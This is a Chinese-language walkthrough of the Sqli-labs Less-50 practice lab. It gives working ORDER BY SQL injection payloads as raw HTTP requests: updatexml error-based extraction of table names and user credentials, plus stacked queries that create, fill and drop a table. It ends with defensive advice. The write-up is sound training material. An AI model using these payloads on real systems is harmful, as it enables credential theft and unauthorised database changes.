## 题目: Sqli‑labs Less‑50

## 题目描述
GET传入sort排序参数，数字型ORDER BY注入；使用`mysqli_multi_query()`支持堆叠注入，同时开启SQL报错回显。ORDER BY位置UNION无法输出数据，读取数据依靠updatexml报错注入，写数据利用堆叠语句执行。

## 核心原理
```php
$sql = "SELECT * FROM users ORDER BY $id";
if (mysqli_multi_query($con1, $sql))
```
关键点：数字型无需引号闭合；`mysqli_multi_query()`支持分号`;`执行多条 SQL；页面输出 SQL 错误信息，updatexml 报错注入可用；ORDER BY 位置 UNION 查询无效，堆叠语句执行结果页面不会直接展示，需要报错注入验证；updatexml 存在 31 字符截断，使用 hex 编码处理长数据与特殊字符。
**解题思路**
1. Burp 抓包修改 sort 参数，使用 updatexml 报错注入依次爆库、表、字段；
2. hex 编码解决报错截断，获取账号密码数据；
3. 使用`;`堆叠执行 create、insert、drop 完成写库操作；
4. 通过报错注入验证堆叠写操作结果，测试完毕清理测试表。

## 解题步骤
### 1. 报错注入爆库名 Burp 包
```
GET /sqli-labs/Less-50/?sort=1 and updatexml(1,concat(0x7e,database()),1) HTTP/1.1
Host: 127.0.0.1
```
页面报错：`XPATH syntax error: '~security'`

### 2. 爆表名 Burp 包
```
GET /sqli-labs/Less-50/?sort=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) HTTP/1.1
Host: 127.0.0.1
```
报错返回：`~emails,referers,uagents,users`

### 3. 爆字段名 Burp 包
```
GET /sqli-labs/Less-50/?sort=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)),1) HTTP/1.1
Host: 127.0.0.1
```
报错返回：`~id,username,password`

### 4. hex 编码读取 users 数据 Burp 包
```
GET /sqli-labs/Less-50/?sort=1 and updatexml(1,concat(0x7e,substr(hex((select group_concat(username,0x3a,password) from users)),1,30)),1) HTTP/1.1
Host: 127.0.0.1
```
> 
> 修改 substr 偏移参数分段获取全部 hex 字符串，解码得到明文。

### 5. 堆叠创建 dump50 测试表 Burp 包
```
GET /sqli-labs/Less-50/?sort=1; create table dump50(username varchar(100),password varchar(100)) HTTP/1.1
Host: 127.0.0.1
```

### 6. 堆叠把 users 数据插入 dump50 Burp 包
```
GET /sqli-labs/Less-50/?sort=1; insert into dump50 select username,password from users HTTP/1.1
Host: 127.0.0.1
```

### 7. 报错注入验证写入行数 Burp 包
```
GET /sqli-labs/Less-50/?sort=1 and updatexml(1,concat(0x7e,(select count(*) from dump50)),1) HTTP/1.1
Host: 127.0.0.1
```

### 8. 清理测试表 Burp 包
```
GET /sqli-labs/Less-50/?sort=1; drop table dump50 HTTP/1.1
Host: 127.0.0.1
```

## 踩坑记录
1. ORDER BY 位置 UNION 无法输出数据，读数据使用报错注入。
2. 堆叠语句执行后页面依旧展示第一条查询结果，堆叠执行效果需要通过查询验证，页面无直接回显。
3. updatexml 报错存在 31 字符截断，数据包含单引号特殊字符，优先 hex 编码。
4. insert select 堆叠时，目标表与源表列数必须保持一致。
5. 测试完成 drop 删除临时表，防止污染靶场数据库。

## 知识点总结
- ORDER BY 堆叠注入：依靠`mysqli_multi_query()`，读数据使用报错注入，写数据使用分号堆叠。
- updatexml 报错注入，`0x7e(~)`作为标记符，hex 编码解决截断与特殊字符问题。
- 堆叠注入可以执行 create、insert、update、drop 等写操作，页面不返回堆叠 SQL 执行结果，需要二次查询验证。
- 防御：sort 参数配置列名白名单；关闭`mysqli_multi_query`多语句功能；预编译参数绑定；生产环境关闭数据库报错回显。
